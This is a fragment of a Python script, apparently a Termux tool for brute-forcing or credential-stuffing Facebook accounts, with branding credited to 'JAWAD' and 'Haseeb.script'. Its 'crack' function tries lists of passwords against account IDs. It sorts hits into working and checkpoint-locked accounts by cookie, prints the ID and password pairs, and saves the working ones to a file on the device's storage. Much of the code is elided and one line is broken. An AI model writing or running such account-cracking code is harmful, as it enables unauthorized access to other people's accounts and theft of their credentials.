...
try:
	...
	key1 = open('/data/data/com.termux/files/usr/bin/.mrJAWAD-cov', 'r').read()

except:

	kok=open('/data/data/com.termux/files/usr/bin/.mrJAWAD-cov', 'w')
...
def crack(idf,pwv):
	...
	sys.stdout.write('\r %s[ JAWAD ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print( f'\r\x1b[1;91m [ jawad jh -CP ] {idf} | {pw}')
				...
				print(f'\r\x1b[1;92m [ jawad jh-OK ] {idf} | {pw}')
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				rint( f'\r\x1b[1;91m [ JAWAD-CP ] {idf} | {pw}')
				...
				print(f'\r\x1b[1;92m [ JAWAD-OK ] {idf} | {pw}')

				wrt =('%s - %s' % (idf,pw))

				ok.append(wrt)

				open('/sdcard/JAWAD-OK.txt','a').write('%s\n' % wrt)
...
/$$ /$$ /$$$$$$ /$$$$$$$ | $$ | $$ /$$__ $$| $$__ $$ | $$ | $$| $$ \__/| $$ \ $$ | $$$$$$$$| $$$$$$ | $$$$$$$ | $$__ $$ \____ $$| $$__ $$ | $$ | $$ /$$ \ $$| $$ \ $$ | $$ | $$| $$$$$$/| $$$$$$$/ |__/ |__/ \______/ |_______/ 
...
__________________×______________________
  ...
  Github   :  Haseeb.script

  Facebook : Termux Teacher Haseen
